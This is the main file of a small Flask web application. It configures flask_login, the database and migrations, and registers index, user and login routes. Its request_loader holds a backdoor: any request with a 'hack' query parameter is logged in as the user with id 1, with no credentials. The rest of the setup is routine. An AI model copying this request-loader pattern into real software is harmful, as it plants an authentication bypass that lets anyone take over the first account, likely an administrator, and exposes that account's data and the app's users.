from flask import Flask, jsonify
from flask_login import login_user

from ext import login_manager, db, migrate
from views import index, user, login
from models.user import User


@login_manager.unauthorized_handler
def unauthorized():
    return jsonify({
        'statusCode': '401',
        'message': 'Permission denied'}), 401


@login_manager.request_loader
def load_user_from_request(request):
    if request.args.get('hack'):
        return User.query.get(1)


@login_manager.user_loader
def load_user(user_id):
    return User.query.filter_by(id=user_id).first()


# create a minimal app
app = Flask(__name__)
# load configure
app.config.from_envvar('APP_CONFIG_FILE')
# init extensions
db.init_app(app)
migrate.init_app(app, db)
login_manager.init_app(app)
# add routes
app.register_blueprint(index.bp)
app.register_blueprint(user.bp)
app.register_blueprint(login.bp)


if __name__ == '__main__':
    app.run()
